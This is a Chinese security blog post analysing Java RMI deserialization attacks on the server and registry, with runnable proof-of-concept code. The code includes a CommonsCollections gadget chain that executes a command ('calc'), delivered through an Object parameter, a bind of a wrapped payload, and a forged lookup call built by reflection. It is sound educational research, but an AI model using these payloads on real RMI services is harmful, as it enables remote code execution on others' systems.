<!DOCTYPE html>
<html lang="zh">
  <head>
    
    <meta charset="UTF-8">
    <title>RMI反序列化 - N0tluS.site</title>
    <link rel="shortcut icon" href="/static/img/icon.png">
    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
    
<link rel="stylesheet" href="/static/kico.css">
<link rel="stylesheet" href="/static/hingle.css">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta property="og:site_name" content="N0tluS.site">
    <meta property="og:title" content="RMI反序列化"/>
    
    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
    
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    <header>
    <div class="head-title">
        <h4>N0tluS.site</h4>
    </div>
    <div class="head-action">
        <div class="toggle-btn"></div>
        <div class="light-btn"></div>
        <div class="search-btn"></div>
    </div>
    <form class="head-search" method="post">
        <input type="text" name="s" placeholder="搜索什么？">
    </form>
    <nav class="head-menu">
        <a href="/">首页</a>
        <div class="has-child">
            <a href>分类</a>
            <div class="sub-menu">
                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="category-link" href="/categories/wp/">wp</a>
            </div>
        </div>
        
            <a href="/about">关于我</a>
        
    </nav>
</header>

    <main>
    <div class="wrap min">
        <section class="post-title">
            <h2>RMI反序列化</h2>
            <div class="post-meta">
                <time class="date">2024.11.30</time>
            
                <span class="category"><a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></span>
            
            </div>
        </section>
        <article class="post-content">
        
            <p>0x00前言</p>
<p>在分析RMI源码的时候，我们知道在client、registry、server中都有反序列化的操作，也就是说三个角色都有被攻击的可能，这里在贴一下su18师傅总结的rmi流程分析，</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241111183350799.png" class="" title="image-20241111183350799">

<blockquote>
<p>RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>
<ol>
<li>RMI 客户端在调用远程方法时会先创建 Stub ( <code>sun.rmi.registry.RegistryImpl_Stub</code> )。</li>
<li>Stub 会将 Remote 对象传递给远程引用层 ( <code>java.rmi.server.RemoteRef</code> ) 并创建 <code>java.rmi.server.RemoteCall</code>( 远程调用 )对象。</li>
<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>
<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>
<li>RMI服务端的远程引用层( <code>sun.rmi.server.UnicastServerRef</code> )收到请求会请求传递给 Skeleton ( <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code> )。</li>
<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>
<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>
<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>
<li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>
</ol>
</blockquote>
<h1 id="0x01攻击RMI"><a href="#0x01攻击RMI" class="headerlink" title="0x01攻击RMI"></a>0x01攻击RMI</h1><h2 id="攻击server端"><a href="#攻击server端" class="headerlink" title="攻击server端"></a>攻击server端</h2><h3 id="01恶意服务参数"><a href="#01恶意服务参数" class="headerlink" title="01恶意服务参数"></a>01恶意服务参数</h3><p>在客户端收到服务端创建的stub后，会在本地调用这个stub并传递参数，stub会序列化传入参数，并且传递给服务端，服务端会反序列化客户端传入的参数并进行调用，本质上就是在<code>UnicastRef#invoke()</code>中，调用<code>unmarshalValue()</code>，如下图：</p>
<img src="/2024/11/30/RMI反序列化/image-20241116152432530.png"  alt="image-20241116152432530" style="zoom:67%;" />

<img src="/2024/11/30/RMI反序列化/image-20241116152623888.png"  alt="image-20241116152623888" style="zoom:67%;" />

<p>当传入类不为上述类型时，就会进行反序列化</p>
<p>如果这个参数是<strong>Object类型</strong>的情况下，客户端可以传给服务端恶意的类，直接造成反序列化漏洞</p>
<p>我们创建一个<code>RemoteInterface</code>接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object obj)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的实现类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteInterfaceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteInterfaceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object obj)</span><span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span>+obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span><span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Goodbye&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册中心</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;</span><br><span class="line">        RemoteInterface remoteInterface=<span class="keyword">new</span> <span class="title class_">RemoteInterfaceImpl</span>();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/RemoteInterfaceImpl&quot;</span>,remoteInterface);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，方法<code>sayHello</code>方法的参数类型就是Object，这样server端就会对传进来的参数进行反序列化。我们可以在客户端直接传入反序列化的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        RemoteInterface remoteInterface=(RemoteInterface) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/RemoteInterfaceImpl&quot;</span>);</span><br><span class="line">        System.out.println(remoteInterface.sayGoodBye());</span><br><span class="line">        System.out.println(remoteInterface.sayHello(EvilClass()));<span class="comment">//传入恶意对象，server端会对此进行反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> expMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常我们需要<strong>保证客户端和服务端调用的服务接口是一样的</strong>，那如果不一样会发生什么？</p>
<p>我们把服务端<code>RemoteInterface</code>接口的参数改成<code>HelloObject name</code>，同时客户端保持不变，仍然是<code>Object name</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(HelloObject obj)</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line"><span class="comment">//RemoteInterface</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(HelloObject obj)</span><span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span>+obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//RemoteInterfaceImpl</span></span><br></pre></td></tr></table></figure>

<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241023202523709.png" class="" title="image-20241023202523709">

<p>此时再进行远程方法调用就会出现错误，这是因为客户端调用的方法和服务端的方法签名不一致导致的。我们在分析rmi源码中的<code>UnicastServerRef#dispatch</code>的时候知道，要查找一个<code>Method</code>就是通过查找<code>Method</code>的哈希值来查找的</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241023204223645.png" class="" title="image-20241023204223645">

<p>那么我们有没有办法让让传递服务端参数是<code>HelloObject</code>的<code>Method</code>的哈希，但是传递的参数却不是<code>HelloObject</code>而是恶意的反序列化数据？</p>
<p>最简单的办法就是debug时修改，现在我们把client端的参数类型为<code>HelloObject</code>的<code>sayHello</code>方法一起写上</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241111190415470.png" class="" title="image-20241111190415470">

<p>因为最后客户端远程调用服务端的方法是通过<code>RemoteObjectInvocationHandler#invokeRemoteMethod</code>用反射调用的方法实现的，所以我们在这个方法上打下断点</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241111190625900.png" class="" title="image-20241111190625900">

<p>然后在客户端调用<code>sayHello</code>方法时，改成调用参数为<code>HelloObject</code>的<code>sayHello方法</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method = RemoteInterface.class.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>, HelloObject.class)</span><br></pre></td></tr></table></figure>

<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241111191506783.png" class="" title="image-20241111191506783">

<p>最后成功弹出计算器</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241111191744360.png" class="" title="image-20241111191744360">

<h3 id="02动态类加载（待填坑）"><a href="#02动态类加载（待填坑）" class="headerlink" title="02动态类加载（待填坑）"></a>02动态类加载（待填坑）</h3><p>本质上是远程加载对象，但是利用条件很苛刻，实际环境下很难遇到到这个情况</p>
<h2 id="攻击registry端"><a href="#攻击registry端" class="headerlink" title="攻击registry端"></a>攻击registry端</h2><h3 id="01bind-rebind"><a href="#01bind-rebind" class="headerlink" title="01bind&amp;rebind"></a>01bind&amp;rebind</h3><p>高版本jdk中，注册中心和服务端都是绑定在一起的，首先由server端向registry端绑定服务对象，这个对象是一个server端生成的动态代理类，当调用bind方法的时候，registry端会通过<code>RegistryImpl_Skel#dispatch</code>方法来将这个动态代理类进行反序列化。</p>
<p>所以我们可以构造一个恶意的server端，向registry端输送恶意对象，也就是由server端攻击registry，在其反序列化的时候就可以被调用</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241112183745605.png" class="" title="image-20241112183745605">

<p>下面是server端攻击registry的示例，在写poc前注意一点，因为HashMap不是继承自<code>Remote</code>接口的类，不能直接进行bind操作，所以需要写一个包装类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Registry registry=LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1099/RemoteInterfaceImpl&quot;</span>,<span class="keyword">new</span> <span class="title class_">Wrapper</span>(expMap));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Wrapper</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, Serializable &#123;</span><br><span class="line">        <span class="keyword">private</span> Object obj;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Wrapper</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.obj=obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把<code>bind</code>改成<code>rebind</code>的效果是一样的</p>
<h3 id="02unbind-lookup"><a href="#02unbind-lookup" class="headerlink" title="02unbind&amp;lookup"></a>02unbind&amp;lookup</h3><p><code>unbind</code>和<code>lookup</code>也会调用<code>readObject</code>，因为<code>lookup</code>常见于客户端中，所以这里介绍从客户端进行对注册中心的攻击<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241112205030024.png" class="" title="image-20241112205030024"></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241112204115718.png" class="" title="image-20241112204115718">

<p>但是这里的限制是，当我们调用<code>unbind</code>和<code>lookup</code>的时候，只允许我们传递字符串，没办法传递恶意对象。要解决这个问题就需要我们通过反射来伪造连接请求</p>
<p>我们看看<code>Naming.lookup</code>这一步发生了什么</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113100130601.png" class="" title="image-20241113100130601">

<p>在里面调用了<code>registry.lookup</code>，而<code>registry</code>又是前面<code>getRegistry</code>返回的<code>RegistryImpl_Stub</code>对象</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113100421073.png" class="" title="image-20241113100421073">

<p><code>operations</code>位于<code>RegistryImpl_Stub</code>中</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113103501012.png" class="" title="image-20241113103501012">

<p><code>ref</code>位于<code>RemoteObject</code>中</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113103617533.png" class="" title="image-20241113103617533">

<p>可以通过反射调用来获取这两个变量，我们先看一下类的继承图</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241113142110190.png" class="" title="image-20241113142110190">

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ref</span></span><br><span class="line">Field[] fields_0=registry.getClass().getSuperclass().getSuperclass().getDecalredFields();</span><br><span class="line">fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">Unicast ref=(UnicastRef)fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取operations</span></span><br><span class="line">Field[] fields_1=registry.getClass().getDeclaredFields();</span><br><span class="line">fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">Operation[] operations=(Operation[])fields_1[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure>

<p>最后就是伪造<code>lookup</code>代码，模拟通信过程并且传入恶意信息，其中o是传入的恶意对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RemoteCall var2=ref.newCall((RemoteObject)registry,operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">ObjectOutput var3=var2.getOutputStream();</span><br><span class="line">var3.writeObject(o);</span><br><span class="line">ref.invoke(var2);</span><br></pre></td></tr></table></figure>

<p>接下来在client端模拟攻击过程</p>
